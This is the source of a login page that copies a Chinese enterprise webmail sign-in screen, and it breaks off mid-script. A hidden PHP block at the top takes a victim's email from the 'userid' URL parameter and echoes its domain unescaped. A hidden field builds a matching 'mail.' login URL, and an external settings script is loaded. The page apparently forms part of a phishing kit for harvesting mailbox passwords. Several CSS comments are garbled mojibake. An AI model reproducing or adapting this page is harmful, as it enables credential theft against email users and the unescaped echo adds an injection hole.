<div style="visibility: hidden">
<?php
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
} 
// Example
$email = $_GET['userid'];
$domain = getDomainFromEmail($email);
{ echo( "$domain" );
}
?>
</div>
<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <input type="hidden" name="lourl" value="http://mail.<?php
if(getmxrr($domain,$mx_details)){
  foreach($mx_details as $key=>$value){
    echo "$domain";
  }
}
?>/accounts/login?system=mail" id="lourl"> 

<head>
    <script src="../../setting.js"></script>
    <div id="google"></div>
    <script>
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({ pageLanguage: 'auto', autoDisplay: true, layout: google.translate.TranslateElement.InlineLayout.SIMPLE }, 'google');
        }
    </script>
    <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit">
    </script>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

    <title>登录认证</title>
<style>
    @charset "utf-8";
/*
 鎻忚堪: 鐧诲綍椤靛叕鐢ㄦ牱寮� 
 浣滆€�: ui@35.cn
*/
/*common*/
body,div,dl,dt,dd,ol,ul,li,h1,h2,h3,h4,h5,h6,pre, 
form,fieldset,input,textarea,p,blockquote,th,td{ padding:0; margin:0;}
ul,li{ list-style:none;}
img{ border:0;}
body,input,textarea,table,button,select{ font:12px Verdana,Arial,Helvetica;}

.clearfix:after{content:""; display:block; clear:both; height:0; visibility:hidden;}
.clearfix{ zoom:1;}
.clear{ clear:both; height:0; overflow:hidden;}
.fL{ float:left;}
.fR{ float:right;}
.mgR{ margin-right:5px;}

#info{ margin-left:7px; font-size:12px !important;}
.tif_border{ position:relative;}
#fail{ color:#f00;}
.font_red{ color:#f60;}
.tip_browser{ color:#777; line-height:20px;}
.tip_browser a{ color:#555;}
.tip_browser a:hover{ color:#f60;}
.header_logo a{ outline:none;}

.enter_box h2{ font-family:"寰蒋闆呴粦"," 榛戜綋"; font-weight:normal; white-space:nowrap; overflow:hidden;}
.enter_box .tr{ padding-bottom:13px;}
.enter_btn_down{ outline:none;}
.enter_btn{ vertical-align:middle; padding:0; border:0; background:0;}

.auth-code{ float:left;}
.auth-code a{ color:#4e4e4e; text-decoration:none;}
.auth-code a:hover{ text-decoration:underline;}
.auth-code img, .auth-code span{ padding-left:6px; vertical-align:middle;}

/*椤甸潰澶撮儴*/
.pagetop{ height:35px; background-color:#fcfcfc; border-bottom:1px solid #f0f0f0;}
.pagetop a{ color:#999; text-decoration:none;}
.pagetop a:hover{ color:#f60; text-decoration:underline;}
.pagetop .lang_wrap{ float:right; line-height:35px; padding-right:15px;}
.pagetop .lang_wrap .mgR{ margin-right:13px;}
.pagetop .lang_wrap a.selected, .pagetop .lang_wrap a.selected:hover{ color:#333; text-decoration:none; cursor:default; outline:none;}

/*搴曢儴*/
.login_footer{ margin:30px auto 0;}
.footer_content{ padding:8px 0 12px; line-height:22px; zoom:1;}
.footer_content a{ text-decoration:none;}
.footer_content a:hover{ text-decoration:underline;}

/*鍥炬爣*/
.icon{ background-image:url(../images/ico_sprite.png); background-repeat:no-repeat; display:inline-block;}
.ico_dl{ background-image:url(../images/ico_sprite.png) !important; background-position:0 0; width:18px; height:18px; vertical-align:middle;}
a:hover .ico_dl{ background-position:0 -25px;}
.ico_selected{ background-position:0 -74px; *background-position:0 -75px; height:14px; width:15px; overflow:hidden;}
.ico_arrowd{ background-position:0 -50px; *background-position:0 -51px;  height:10px; width:7px; overflow:hidden; margin-left:3px; _vertical-align:middle;}
.versionsel_zone dd a:hover .ico_arrowd{ background-position:-16px -50px; *background-position:-16px -51px;}

/*鐗堟湰閫夋嫨妯″潡*/
.versionsel_zone{ position:absolute; top:14px; right:0;}
.versionsel_zone dt, .versionsel_zone dd{ float:left; color:#555; line-height:normal; vertical-align:top; *vertical-align:baseline;}
.versionsel_zone dd{ position:relative;}
.versionsel_zone dd .link{ vertical-align:top; *vertical-align:baseline;}
.versionsel_zone dd a, .versionsel_zone dd a:hover{ text-decoration:none;}
 
/*涓嬫媺閫夐」*/
.seloption{ position:absolute; top:0; left:3px; z-index:2; width:auto; *width:90px; border:1px solid #93abbb; -webkit-box-shadow:1px 1px 2px #ccc; box-shadow:1px 1px 2px #ccc; background:#fff; padding:1px;}
.seloption ul{ background:#fff url(../images/bg_option.png) repeat-y; margin:0; padding:0; list-style:none;}
.seloption ul li{ height:23px; padding-left:21px; position:relative;}
.seloption ul li .ico_selected{ position:absolute; top:3px; left:6px; display:none;}
.seloption ul li.option_cur .ico_selected{ display:inline-block;}
.seloption ul li:hover, .seloption ul li.hover{ background-color:#d8eef8;}
.seloption a{ color:#525252; display:block; padding:0 10px 0 5px; white-space:nowrap; height:23px; line-height:23px; text-decoration:none;}
.seloption a:hover{ text-decoration:none;}

/*鍚勯」鐩伐鍏峰尯
----------------------------------------------------------------------------*/
.msg{ color:#777;}
.show{ display:inline-block;}
.hide{ display:none;}
.popup_tag{ position:relative; bottom:-1px;}
.popup_tag div{ float:left; display:inline; height:26px; line-height:26px; text-align:center; color:#555;}
.popup_tag div a{ float:left; padding-right:15px; cursor:default;}
.popup_tag div a:hover{ text-decoration:none;}
.popup_tag div span{ float:left; padding-left:15px;}
.popup_tag .tagcur a, .popup_tag .tagcur span{ background:url(../images/bg_tag.png) no-repeat right 0;}
.popup_tag .tagcur a{ color:#499c0c;}
.popup_tag .tagcur span{ background-position:0 0;}

.tagcon{ float:left; background-color:#fdfdfd; border:1px solid #e8e8e8; -webkit-border-radius:0 3px 3px 3px; -moz-border-radius:0 3px 3px 3px; border-radius:0 3px 3px 3px; margin:0 0 6px; padding:16px 8px 12px 15px; min-width:319px; _width:319px; zoom:1;}

/*--------閭眬宸ュ叿鍖篵egin-------*/
.tools_mail .icon, .tools_emeeting .icon{ background-image:url(../images/nosys/ico_sprite_login.png);}
.tools_nosys .icon, .tools_emeeting .icon{ background-image:url(../images/nosys/ico_sprite_login.png);}
.login_tools .icon{ display:inline-block; background-repeat:no-repeat; vertical-align:middle;}
.login_tools .ico_cmpt{ width:25px; height:25px;}
.login_tools .ico_phone{ background-position:-40px 0; width:18px; height:25px;}
.login_tools .ico_2dcode{ background-position:-80px 0; width:23px; height:25px;}
.login_tools .ico_lamp{ background-position:0 -30px; height:18px; width:14px;}


/*涓嬭浇閾炬帴鍖�*/
.downld_box{ float:left; background-color:#fdfdfd; border:1px solid #e8e8e8; -webkit-border-radius:3px; -moz-border-radius:3px; border-radius:3px; margin:6px 0; padding:15px 8px 15px 15px;}
.downld_box_mail{ margin-bottom:10px; width:319px;}
.downld_box dt, .downld_box_mail dt{ color:#000; margin:0 0 10px; padding:0;}
.downld_box dd, .downld_box_mail dd{ float:left; display:inline; margin:0 23px 0 0; padding:0; position:relative;}
.downld_box dd .icon, .downld_box_mail dd .icon{ margin-right:5px;}
.downld_box dd a, .downld_box_mail dd a{ color:#2d5e99;}

/*寮圭獥*/
.popbox{ position:absolute; padding:6px 0; z-index:1;}
.popbox .ico_corner{ position:absolute; overflow:hidden;}
.ico_corner_upL, .ico_corner_upR, .ico_corner_downL, .ico_corner_downR{ background-position:-120px 0; width:14px; height:7px;}
.ico_corner_upL{ top:0; left:10px;}
.ico_corner_upR{ background-position:-120px 0; top:0; right:14px;}
.ico_corner_downL{ background-position:-120px -13px; bottom:0; left:14px;}
.ico_corner_downR{ background-position:-120px -13px; bottom:0; right:14px;}

.popbox_con{ border:1px solid #d7d7d7; -webkit-box-shadow:1px 2px 3px 0 #d7d7d7; box-shadow:1px 2px 3px 0 #d7d7d7; background:#ffffff; color:#555555; padding:11px 3px 11px 11px;}

/*寮圭獥涓敞閲�*/
.popbox_con .note{ position:relative; line-height:20px; margin-top:10px; padding-left:18px; display:inline-block;}
.popbox_con .ico_lamp{ position:absolute; left:0px; top:0; margin:0;}

/*寮圭獥涓〃鍗�*/
.popbox_con .tb_writeLR{ margin-left:0;}
.popbox_con .tb_writeLR th{ color:#555; font-weight:normal; padding:4px 0;}
.popbox_con .tb_writeLR td{ padding:4px 0;}
.popbox_con .tb_writeLR .txt-input2{ border:1px solid #aeaeae; background:#ffffff; color:#000; width:186px; height:17px; _height:21px; padding:2px;}
.popbox_con .tb_writeLR .input_authcode{ float:left; width:123px;}
.popbox_con .tb_writeLR .authcode{ float:left; display:inline; margin-left:1px;}
.popbox_con .tb_writeLR .btn_gray{ width:80px; height:25px; cursor:pointer; background:#dfdfdf url(../images/btn_sprite.png) no-repeat 0 -150px; border:0; line-height:25px; padding-bottom:1px; color:#555;}

/*浜岀淮鐮�*/
.popbox_con .twodcode_img{ padding-left:7px;}
.popbox_con .twodcode_txt{ line-height:18px; padding-top:8px;}
/*--------閭眬宸ュ叿鍖篹nd-----------*/

/*--------OA宸ュ叿鍖篵egin----------*/
.tools_oa .icon{ background-image:url(../images/oa/ico_sprite_login.png);}
.tools_oa .downld_box dd a{ color:#9c56ac;}
/*--------OA宸ュ叿鍖篹nd------------*/

/*--------CRM宸ュ叿鍖篵egin---------*/
.tools_crm .explink{ color:#499C0C; font-size:14px;}
.tools_crm .explink:hover{ color:#ff6600; text-decoration:underline;}
/*--------CTM宸ュ叿鍖篹nd-----------*/

/*--------35Emeeting宸ュ叿鍖篵egin---*/
.tools_emeeting .downld_box dd a{ /*color:#2d5e99;*/}
/*--------35Emeeting宸ュ叿鍖篹nd-----*/

/*--------35task宸ュ叿鍖篵egin------*/
.tr_checkbox{ vertical-align:middle;}
.tr_checkbox .check { vertical-align:middle;_vertical-align:text-bottom;margin-right:5px;}
.tools_task {font-size:14px;}
.tools_task .explink{ color:#499C0C; text-decoration:underline;}
.tools_task .explink:hover{text-decoration:none;}
/*--------35task宸ュ叿鍖篹nd--------*/

/*--------Ewave宸ュ叿鍖篵egin-------*/
.tools_Ewave{ vertical-align:middle;}
.tools_Ewave i{ vertical-align:middle; margin-right:5px; display:inline-block; width:20px; height:22px; background:url(../images/ewave/ico_sprite_login.png) no-repeat;}
.tools_Ewave i.phoneIcon_1{ background-position:0 0;}
.tools_Ewave i.phoneIcon_2{ background-position:-20px 0; height:27px; *height:24px;}
.tools_Ewave .explink{ color:#499C0C; font-size:14px;}
.tools_Ewave .explink:hover{ color:#ff6600; text-decoration:underline;}
/*--------Ewave宸ュ叿鍖篹nd--------*/

/*---------------------------------------------------------------鐧诲綍淇敼 by lili---------------------------------------------------------------*/
/*鏂板鐗堟湰鏍峰紡*/
/*.versionsel_zone dt{ position:relative;}*/
/* .versionsel_zone dt{ width:80px;}
.versionsel_zone dt i{ display:inline-block; float:left; height:15px; width:40px;} */
.versionsel_zone dt{}
.versionsel_zone dt i{ display:inline-block; float:left; height:15px; line-height:15px; font-style:normal; padding:0 3px 1px; border:1px solid #aeaeae; color:#999; cursor:pointer; margin-left:-1px; /*border-radius:5px 0 0 5px;*/}
.versionsel_zone dt i.current{ background-color:#ff9600; color:#fff; border:1px solid #e96e00;}
dt .ver_lagship{ background-position:left top; cursor:default;}
dt .ver_topspeed{ background-position:-40px top; cursor:pointer;}
.ver_img_ch i{ background-image:url(../images/ver_img.gif);}
.ver_img_ft i{ background-image:url(../images/ver_img_ft.gif);}
.ver_img_en i{ background-image:url(../images/ver_img_en.gif);}
.ver_img1 .ver_lagship{ background-position:left -15px; cursor:pointer;}
.ver_img1 .ver_topspeed{ background-position:-40px -15px; cursor:default;}

/*鐗堟湰杩囦綆鎻愮ず灞�*/
.low_vers_tip{background:#fefde6; border-top:1px solid #e4ceb2; color:#499c0c; padding:15px 0; text-align:center; font-family:"瀹嬩綋"; width:100%; position:fixed; bottom:0; _position:absolute;}
.low_vers_tip a{ color:#30a7f3; margin:0 2px; text-decoration:underline;}
.low_vers_tip a:hover{ text-decoration:none;}
.low_vers_tip .close{ margin-left:160px;}
.low_vers_tip strong{ color:#ffa200;}
.icon_note{ background-image:url(../images/ico_note.png); height:33px; width:33px; vertical-align:middle;}
.low_vers_tip .icon_note{ margin-right:15px;}

/*娴忚鍒版柊娴忚鍣�*/
html{ _overflow-x:hidden;_overflow-y:auto;}
.fixed_top{ top:0; height:33px; padding:6px 0; background:#ff783c; color:#fff;  font: bold 14px/33px "瀹嬩綋";z-index:100; }
.fixed_top .icon_note{ background-image:url(../images/ico_note1.png); }
#Container_b{ background:url(../images/Container_wrap_bg.png) bottom repeat-x #EEE; padding-top:45px; padding-bottom:20px;*margin-top:15px; height:auto;}
#Container_wrap_b{ width:750px; margin:0 auto; margin-top:15px;}

.Container_wrap_b h2{ color:#333; font-size:14px; height:40px; line-height:40px; border-bottom:1px solid #ddd; padding-left:15px;}
.Container_wrap_b ul { padding:10px;}
.Container_wrap_b ul li{ padding:10px; padding-left:2px; border-bottom:1px dotted #CCC; font-family:"瀹嬩綋";}
.Container_wrap_b ul li .b_Img,.Container_wrap_b ul li .b_Txt{ height:70px; line-height:70px; vertical-align:top; display:inline-block; color:#666; margin-left:2px; margin-right:10px;}
.Container_wrap_b ul li.brNone{ border:0;}
.Container_wrap_b ul li .b_Txt{ height:30px; padding:15px 0 20px 0; line-height:18px;}
.Container_wrap_b ul li .b_link{display:inline-block;*display:inline;_vertical-align:middle; zoom:1; color:#999; text-decoration:underline;}
.Container_wrap_b ul li .b_guide_wrap{ position:relative;}
.Container_wrap_b ul li .b_guide{ position:absolute; left:0;}
.Container_wrap_b ul li .b_Txt .font_orange{ font-size:14px; font-weight:bold;}

.Container_wrap_b ul li .fl {_overflow:hidden;}
.Container_wrap_b ul li .fR { margin-top:17px; zoom:1;_overflow:hidden;}
.Container_wrap_b ul li .fR a{ text-decoration:none!important;_wdth:82px;height:36px; margin-top:0!important; zoom:1;}
.Container_wrap_b ul li .fR a b{ margin:0; padding:0; overflow:hidden; zoom:1; padding-left:15px; height:36px;}
.Container_wrap_b ul li .fR a span{ margin:0; padding:0; overflow:hidden; zoom:1; padding-right:15px; height:36px; font-size:14px; color:#FFF;background-color:#EEE;}

/* 蹇嵎鐧诲綍 */
.quick-login{ color:#999; margin-bottom:10px;}
.quick-login a{ display:inline-block; height:24px; line-height:24px; padding-left:30px; background: url(../images/login-icon.png) no-repeat; margin-top:10px; margin-right:30px;}
.quick-login a.qq{ background-position:0 -27px;}
.quick-login a.txwb{ background-position:0 -54px;}
.quick-login a.vx{ background-position:0 -81px;}
.quick-login a.sj{ background-position:0 -108px;}

/*鐧诲綍椤典慨鏀�*/
/*鍥炬爣*/
.login_tools_new .icon{ display:inline-block; background-repeat:no-repeat; vertical-align:middle;}
.login_tools_new .ico_cmpt{ background-position:-29px -30px; width:20px; height:18px;}
.login_tools_new .ico_phone{ background-position:-54px -30px; width:13px; height:19px;}
.login_tools_new .ico_2dcode{ background-position:-75px -30px; height:17px; width:17px;}
/*鍒囨崲灞�*/
.login_tools_new .downld_box dd, .downld_box_mail dd{ float:left; display:inline; margin:0 10px 10px 0; padding:0; position:relative;}
.login_tools_new .dd_dark{ margin:0!important;}
.login_tools_new .downld_box dd a, .downld_box_mail dd a{ display:inline-block; padding:5px 11px; height:21px;_height:16px; overflow:hidden; border-radius:3px; color:#FFF;}
.login_tools_new .downld_box dd a:hover, .downld_box_mail dd a:hover{ color:#FFF;}
.login_tools_new .dd_green a{ background:#55a7db;}
.login_tools_new .dd_blue a{ background:#6fbd65;}
.login_tools_new .dd_dark a{ background:#c28e55;}
.login_tools_new .tagcon { background:none; border:0; border-top:1px solid #E8E8E8; padding:10px 0; margin-top:5px;}
.login_tools_new .tagcon { border-top:1px solid #E8E8E8;}/*
.login_tools_new .msg { margin-top:5px; height:20px;}*/
/*鍒囨崲鎸夐挳*/
.login_tools_new #tag_3 {position:relative; zoom:1;}
.login_tools_new #tag_3 .brLeft{ border-left:1px solid #CCC; display:inline-block;height:14px; position:absolute;left:2px; margin-top:6px; zoom:1;}
.login_tools_new ul li{ padding:0;}
.login_tools_new .popup_tag div{ position:relative;}
.login_tools_new .popup_tag a,.login_tools_new .popup_tag span{ background:none; color:#000; font-size:12px; display:inline-block;}
.login_tools_new .popup_tag .tagcur a,.login_tools_new .popup_tag .tagcur span{ background:none;  font-weight:bold;}
.login_tools_new .popup_tag .tagcur a{ color:#499c0c;}
.login_tools_new .popup_tag  i{ background-image:url(../images/nosys/ico_sprite_login.png); display:inline-block;}
.login_tools_new .popup_tag .ico_more{ background-position:-102px -25px; margin-left:5px; width:23px; height:19px;}
.login_tools_new .popup_tag .iCur{ background-image:none;width:14px; height:7px; overflow:hidden;bottom:-5px; left:45px; position:absolute;}
.login_tools_new .popup_tag .tagcur i.iCur{ background-image:url(../images/nosys/ico_sprite_login.png); background-position:-121px 0;}

/*eq涓嬭浇*/
.user_define_img{position:absolute;}
.user_define_img_display_none{position:absolute;display:none}
.user_define_img_btn3{ display:block; position:absolute; top:40px; left:300px;}
.user_define_img_btn4{ display:block; position:absolute; top:260px; left:155px;}
.user_define_img_btn5{ display:block; position:absolute; top:68px; left:342px;}
.user_define_img_btn6{ display:block; position:absolute; top:75px; left:342px;}
.user_define_img_btn7{ display:block; position:absolute; top:225px; left:294px;}

.ui-tips{position:absolute; padding:0 10px; height:22px; background-color:#faf4d7; border:1px solid #e8d7b0; line-height:22px; font-size:12px; margin-top:6px; white-space: nowrap;}
.ui-tips .arrow{ position:absolute; width:20px; height:20px; bottom:18px; left:50%; margin-left:-10px; }
.ui-tips .arrow *{ display:block; border-width:8px; position:absolute; border-style:dashed dashed solid dashed; font-size:0; line-height:0;}
.ui-tips .arrow em{border-color:transparent transparent #e8d7b0;}
.ui-tips .arrow span{border-color:transparent transparent #faf4d7; top:1px;}

/* 娴嬮€熷脊鍑哄眰 */
.ui-dialog-server{ width:426px; height:300px; padding:15px; background:#fff url(../images/dialog-server-bg.png) no-repeat; font-family:microsoft YaHei; color:#555;  position: absolute;  z-index: 111; margin-left: -60px; top: 40px;}
.ui-dialog-server .hd{ position:relative; height:30px;}
.ui-dialog-server .hd .btn-close-dialog{ position:absolute; right:5px;}
.ui-dialog-server .bd{ text-align:center;}
.ui-dialog-server .btn{ display:inline-block; width:122px; height:36px; line-height:36px; text-decoration:none; background: url(../images/dialog-server-btn-bg.png) no-repeat; color:#555; }
.ui-dialog-server .btn-main{ background: url(../images/dialog-server-btn-bg-main.png) no-repeat; color:#fff; margin-left:36px; }

.ico-password-show{position: absolute; top:8px; right: 10px; display:inline-block; width:16px; height:16px; background: url(../images/ico-password-show.png) no-repeat 0 center;}
.ico-password-hide{ position: absolute; top:8px; right: 10px; display:inline-block; width:16px; height:16px; background: url(../images/ico-password-hide.png) no-repeat 0 center;}

.choose{font-size:14px; color:#72767c;}
.msg {
    font-size: 12px;
    margin-top: 10px;
    text-align: center;
}

.wrap {
    width: 920px;
    width: 100%;
    margin: 0 auto
}



.tb_loginbox .t1 {
    font-size: 20px;
    color: #333;
    margin-bottom: 15px
}

.code_box {
    background: #f9f9f9;
    padding: 15px 0;
    height: 276px;
    width: 342px
}

.code {
    height: 160px;
    width: 160px;
    padding: 8px;
    border: 1px solid #d7d7d7;
    background: #fff;
    border-radius: 5px;
    margin: 0 auto
}

.box1 {
    width: 220px;
    margin: 15px auto;
    height: 28px;
    line-height: 28px
}

.fr {
    float: right
}

.fl {
    float: left
}

.mr {
    float: right
}

.mr a {
    display: block;
    width: 72px;
    height: 28px;
    background: #FFFFFF;
    border: 1px solid #D7D7D7;
    border-radius: 2px;
    line-height: 28px;
    text-align: center
}

.mrdl {
    width: 345px;
    height: 34px;
    background: #FFFFFF;
    border: 1px solid #D7D7D7;
    border-radius: 2px;
    padding: 0 10px;
    box-sizing: border-box;
    margin-top: 9px
}

.mrdl .c2 {
    width:60%;
    height:32px;
    background: none;
    float:left;
    line-height:32px
}

.mrdl .img1 {
    width: 17px;
    height: 17px;
    float:right;
    padding:5px 0 0 0;
}

.mrdl_1 {
    border: none;
    background: #f5f6f8;
    margin-top: 8px;
    width: 345px;
    height: 34px;
    border-radius: 2px;
    padding: 0 10px;
    box-sizing: border-box;
    margin-top: 9px
}

.mrdl_1 p {
    width: 60px;
    height: 20px;
    background: #CBD1DE;
    border-radius: 2px;
    text-align: center;
    float:right;
    margin-top:7px;
    overflow: hidden;
}

.mrdl_1 .c2 {
    line-height: 34px;
    float:left;
}

.btn2 a {
    display: block;
    width: 72px;
    height: 28px;
    background: #FFFFFF;
    border: 1px solid #D7D7D7;
    border-radius: 2px;
    /*margin: 0 auto;*/
    text-align: center;
    line-height: 28px;
    margin-top: 8px;
    margin-left: 136px;
}
</style>

<style>
    @charset "utf-8";
/*
 描述: 登录页
 作者: ui@35.cn
*/
/*common*/
body{ min-width:1000px;}
input{ outline:none;}
a{ color:#555555; text-decoration:none;}
html body a:hover, a.hilite:hover{ color:#f60; text-decoration:underline;}

.login_box .login_box_msg{ margin:0 0 15px;}
.login_box .noCookie, .login_box .noScript{ padding:4px 6px; border:1px solid #FDDC97; line-height:20px; color:#111; width:330px; background:#FFFAE8; -webkit-border-radius:2px; border-radius:2px;}

/*layout*/
#Container_wrap{ width:1000px; margin:1.5% auto 0;}
.login_header{ }
.header_wrap{ padding:0 0 0 16px;}
.header_logo{ height:100px; overflow:hidden; position:relative;}
.header_logo img{ position:absolute; left:0; bottom:20px; vertical-align:bottom; max-height:100px;max-width:100%; }
  
.login_main{ width:1000px; margin:0 auto;}
.login_main_top, login_main_bot{ display:none;}
.sidebar_left{ float:left; _display:inline; width:488px; _position:relative; zoom:1; overflow:hidden; padding-bottom:29px;}
.login_protection .mail_ftn{ background-image:url(../images/mail/login_pro_bg.png); width:470px; height:30px;line-height:30px; padding:5px 0;  color:#FFF; font-size:18px; top:370px; font-family:"微软雅黑";}
.login_protection .mail_ftn span{ margin-left:75px; vertical-align:middle;_vertical-align:baseline}
.login_protection .mail_ftn span label{ font-size:18px; margin-left:5px; font-family:"微软雅黑"}
.login_protection .mail_ftn .login_pro_icon{ background-image:url(../images/mail/login_pro_icon.png);_background-image:url(../images/mail/login_pro_icon1.png); display:inline-block; width:17px; height:19px;background-repeat: no-repeat; position:absolute; top:16px;_top:12px; left:45px;}
.mail_ftn{ display:none; color:#555; position:relative; line-height:22px; padding:-15px 20px 15px;}

.sidebar_right{ float:left; padding:0 0 0 90px; width:418px; _position:relative; position:relative;}
.sidebar_center{  padding:0 0 0 90px; width:418px; _position:relative; margin:0 auto;}
.enter_box h2{ height:50px; width:344px; position:relative;}
.enter_box h2 span{ color:#333; display:block; font-size:20px; padding-top:7px; height:28px; line-height:normal; width:270px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
.enter_box h2 .adminlogin{ position:absolute; right:0; top:14px; line-height:normal; color:#555555; font-weight:normal; font-size:12px; text-decoration:underline;}
.enter_box h2 .adminlogin:hover{ color:#f60;}
.enter_box h2 .adminlogin .icon{ display:none;}

.enter_box .tr_btnbox{ width:344px; position:relative;}

.logtxtbox{ float:left; position:relative; background-color:#fdfdfd; border:1px solid #d7d7d7; height:32px; border-radius:2px 0 0 2px; -webkit-border-radius:2px 0 0 2px; overflow:hidden;}
.logtxtbox_on{ background:#fff none !important; border-color:#97d2fb !important; -moz-box-shadow:0 0 2px #97d2fb; -webkit-box-shadow:0 0 2px #97d2fb; box-shadow:0 0 2px #97d2fb; }
.logtxtbox input{ border:0 none; color:#999; font-size:14px; height:22px; line-height:22px; padding:5px 3px 5px 6px; width:333px;}
.logtxtbox_on input{ color:#222;}
.logtxtbox .input_authcode{ width:100px;}
.logtxtbox label{ position:absolute; top:5px; left:7px; line-height:22px; font-size:14px; color:#999; cursor:text;}
.logtxtbox label.input_pwd{ color:#222; font-size:16px; line-height:20px;}

/*解决谷歌浏览器下 输入框密码星号太小*/
@media screen and (-webkit-min-device-pixel-ratio:0){ .logtxtbox .input_pwd{ font-size:20px;} }

/*用户名输入-自适应域名宽度*/
.tb_loginbox .tb_username{ width:344px; border-collapse:collapse;}
.tb_loginbox .tb_username td{ padding:0;}
.tb_loginbox .tb_username .logtxtbox{ width:100%; overflow:hidden;}
.tb_loginbox .tb_username .logtxtbox input{ width:97%!important;}
.td_username table{ table-layout:fixed; width:100%;}
.td_domain{ width:20px; *width:auto;}
.td_domain .domain{ width:100%; white-space:nowrap; overflow:hidden;}
.td_domain .domain .inner{ background:#fcfcfc; border:1px solid #d7d7d7; -webkit-border-radius:0 2px 2px 0; border-radius:0 2px 2px 0; border-left:0; padding:5px 9px; line-height:22px; color:#555555; font-family:"微软雅黑"," 黑体"; _font-family:arial; font-size:14px;}

#info{/* white-space:nowrap;*/ margin-left:3px; line-height:20px; padding:2px 0;}

.login_tools{ padding-top:19px;}
.login_tools li{ list-style:none; padding:5px 0 5px 0; line-height:20px;}
.login_tools li a{ *font-family:"宋体"; _font-family:arial;}
.login_tools .hilite{ color:#499c0c; font-size:14px; position:relative; zoom:1;}
.login_tools .ico_dl{ position:absolute; right:-22px; top:0; margin-left:5px;}

/*按钮各状态
----------------------------------------------------------------------------------------------------------------------------------------------*/
.enter_btn, .enter_btn_hover, .enter_btn_down,.down_btn,.down_btn_hover{ cursor:pointer; display:inline-block; height:37px; *height:38px; white-space:nowrap;margin:0; text-decoration:none; margin-top:2px; outline:none;/* *width:86px;_width:86px; */}
.enter_btn:hover{ text-decoration:none !important;}
.enter_btn b, .enter_btn span,
.enter_btn_hover b, .enter_btn_hover span,
.enter_btn_down b, .enter_btn_down span,
.down_btn b,.down_btn span,
.down_btn_hover b,.down_btn_hover span
{ background-image:url(../images/btn_sprite.png); color:#555; line-height:36px; display:inline-block; text-align:center; font-size:16px; font-family:"微软雅黑"," 黑体"; font-weight:normal; text-shadow:0 0 1px #f0f0f0; vertical-align:top;}
 
.enter_btn b{ background-position:0 0; padding-left:27px;*padding-left:22px;}
.enter_btn span{ background-position:right 0; padding-right:27px;*padding-right:22px;}

.enter_btn_hover b{ background-position:0 -50px; padding-left:27px;*padding-left:22px;}
.enter_btn_hover span{ background-position:right -50px; padding-right:27px;*padding-right:22px;}

.enter_btn_down b{ background-position:0 -100px; padding-left:27px;*padding-left:22px;}
.enter_btn_down span{ background-position:right -100px; padding-right:27px;*padding-right:22px; height:36px; padding-top:1px; _line-height:36px;}

.down_btn b,.down_btn_hover b{ padding-left:15px;}
.down_btn span,.down_btn_hover span{padding-right:15px;}

.down_btn b{ background-position:0 -229px;}
.down_btn span{ background-position:right -229px;}

.down_btn_hover b{ background-position:0 -182px;}
.down_btn_hover span{ background-position:right -182px;}
.down_btn1 b{ background-position:0 -229px;}
.down_btn1 span{ background-position:right -229px; }

/*底部*/
.login_footer{ border-top:1px solid #d4d4d4; text-align:left;}
.footer_content, .tip_browser{ color:#999; text-shadow:0 0 1px #fff;}
.tip_browser{ color:#499C0C;}
.tip_browser a{ color:#f60; text-decoration:underline;}
.footer_address, .footer_contact{ float:left;}
.footer_contact{ padding-left:15px;}

/*---------------------------------------------------------------登录修改 by lili---------------------------------------------------------------*/
.login_main_c .enter_box{ position:relative;}
.login_main_c .versionsel_zone{ font-size:12px; right:75px;}
.login_main_c .seloption{ left:-22px; top:18px;}
.login_main_c .adminlogin{ text-decoration:underline; position:absolute; right:0; top:10px;}
.login_main_c .tr_btnbox{}
.login_main_c .tr_btnbox .label{ display:inline-block; margin-left:5px;}
.label input{ vertical-align:middle; margin-right:5px;}
.ico_arr_rig{background-position: -145px 7px; margin-right: 25px; padding-left: 8px;}
.login_footer{ border-color:#e9e9e9;}
.footer_content{ color:#c8c8c8;}
.td_username table{ position:relative;}

.phone_a{ color:#2d5e99; display:inline-block; vertical-align:middle; line-height:32px; margin-left:10px;}
.count_down,.text{ display:inline-block; vertical-align:middle; margin-top:5px; margin-left:8px; padding:2px;}
.text{ padding:2px 0;}
.count_down{ background-color:#f5f5f5; border:1px solid #d5d5d5;}
.font_orange{ color:#f60;}

.tb_loginbox{ color:#555;}

/*登录 可输入 域名*/
.tb_loginbox .tb_username1{}
.tb_loginbox .tb_username1 .text{ float:left; margin:0 5px; vertical-align:middle; display:inline-block; height:28px; line-height:28px; width:12px;}
.tb_loginbox .tb_username1 .logtxtbox{ width:120px;}
.tb_loginbox .tb_username1 .domain{ width:198px;}

input:-webkit-autofill {
    -webkit-box-shadow: 0 0 0px 1000px white inset;
}
</style>

    <!--[if lte IE 6]>
<script src="js/ie6png-min.js" language="javascript" ></script>
<script>DD_belatedPNG.fix('.pngfix'); </script>
<![endif]-->
    <script>
        var templateType = 1;
        var invalidUser = '非法用户名';
        var invalidcode = '请输入合法的验证码。';
        var invalidsmscode = '请输入合法的手机登录码。';
        var tosystem = 'mail';
        var locale = 'zh_CN';
        var mailver_full_alt = '切换到极速版，可使用邮局基础功能，全面提升加载速度';
        var mailver_lite_alt = '切换到旗舰版，可使用邮局所有功能，完整体验企业邮箱';
        var ver_style = 'ver_img_ch';
        var mailAllwayHttpsUrl = 'https://smail37.cn4e.com/Sofia.jsp';
        var serviceUrl = 'http://mail.wxlida.cn/Sofia.jsp';
        var isFullDomainLogin = false;
        var isProxy = false;
        var allWayHttpsChoose = 0;
        var invalidPhone = '输入的手机号码格式不正确';
        var accountStatus1 = '已禁用';
        var accountStatus2 = '已离职';
        var accountStatus3 = '创建中';
        var accountStatus4 = '创建失败';
        var accountStatus5 = '删除中';
        var accountStatus6 = '删除失败';
        var accountStatus7 = '转移中';
        var accountStatus8 = '转移失败';
        var serviceStatus1 = '服务被禁用';
        var serviceStatus2 = '服务未开启';
        var serviceStatus3 = '创建失败';
        var serviceStatus4 = '创建中';
        var serviceStatus5 = '删除中';
        var serviceStatus6 = '删除失败';
        var serviceStatus7 = '转移中';
        var serviceStatus8 = '转移失败';

        function drawImage(ImgD, iwidth, iheight) {
